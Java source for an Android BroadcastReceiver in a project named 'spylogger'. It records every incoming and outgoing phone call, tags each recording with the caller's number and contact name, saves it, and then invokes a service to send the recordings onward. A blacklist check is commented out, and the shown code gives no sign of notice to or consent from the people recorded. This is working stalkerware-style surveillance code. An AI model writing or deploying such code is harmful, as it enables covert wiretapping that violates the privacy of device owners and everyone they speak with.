package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.services.SendGravacoesService;
import com.gravatasufoca.spylogger.utils.Utils;

import java.io.IOException;
import java.sql.SQLException;
import java.util.Date;


public class CallReceiver extends BroadcastReceiver {


	private boolean remetente;
	private RepositorioGravacao repositorioGravacao;
	private RepositorioTopico repositorioTopico;
	private static MyPhoneStateListener phoneListener;
	private String INCOMING_CALL_ACTION = "android.intent.action.PHONE_STATE";
	private String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
	private String phoneNumber;
	private Context context;

	private MediaRecorderHelper mediaRecorderHelper;

	@Override
	public void onReceive(Context context, Intent intent) {
		this.context = context;
		if(mediaRecorderHelper==null){
			try {
				mediaRecorderHelper=new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.AUDIO);
				mediaRecorderHelper.setLigacao(true);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		if(phoneListener==null){
			phoneListener = new MyPhoneStateListener(intent);

			TelephonyManager telephony = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			telephony.listen(phoneListener,
					PhoneStateListener.LISTEN_CALL_STATE);
		}else{
			phoneListener.setIntent(intent);
		}

		if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
			setPhoneNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
		}
	}
	

	class MyPhoneStateListener extends PhoneStateListener {

		private Intent intent;

		MyPhoneStateListener(Intent intent) {
			super();
			this.intent=intent;
		}
		public void setIntent(Intent intent) {
			this.intent = intent;
		}
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {

			if(state == TelephonyManager.CALL_STATE_IDLE){
				// DESLIGUEI
				Log.d("DEBUG", "IDLE");

				if (mediaRecorderHelper.isRecording()) {
					mediaRecorderHelper.stop();

					try {

						repositorioGravacao = new RepositorioGravacaoImpl(context);
						repositorioTopico=new RepositorioTopicoImpl(context);

						Ligacao ligacao=new Ligacao();
						ligacao.setRemetente(remetente);
						ligacao.setData(new Date());
						ligacao.setArquivo(Utils.getBytesFromFile(mediaRecorderHelper.getRecordedFile()));
						ligacao.setNumero(phoneNumber);
						ligacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,context.getContentResolver()));
						ligacao.setDuracao(mediaRecorderHelper.getDuration());

						Topico topico = repositorioTopico.findByName(ligacao.getNome());
						if (topico == null) {
							topico = new Topico.TopicoBuilder()
									.setNome(ligacao.getNome())
									.setIdReferencia(ligacao.getNumero())
									.setGrupo(false)
									.build(TipoMensagem.AUDIO);

							repositorioTopico.inserir(topico);
						}
						ligacao.setTopico(topico);
						repositorioGravacao.inserir(ligacao);

					} catch (SQLException e) {
						e.printStackTrace();
					}finally {
						try {
							repositorioGravacao.close();
						}catch (Exception a){}
						try {
							repositorioTopico.close();
						}catch (Exception a){}
						SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
						sendGravacoesService.enviarTopicos();
					}

				}

			}else{
				if(!mediaRecorderHelper.isRecording()){
					if(state == TelephonyManager.CALL_STATE_OFFHOOK){
						// ESTOU LIGANDO
						Log.d("DEBUG", "OFFHOOK");
						setRemetente(true);

					}else{
						// RECEBI
						Log.d("DEBUG", "RINGING");
						setPhoneNumber(incomingNumber);
						setRemetente(false);
					}

//					if(!Utils.isInBlackList(context, phoneNumber))
					try {
						mediaRecorderHelper.start();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
	}


	public void setPhoneNumber(String phoneNumber) {
		this.phoneNumber = phoneNumber;
	}

	public void setRemetente(boolean remetente) {
		this.remetente = remetente;
	}

}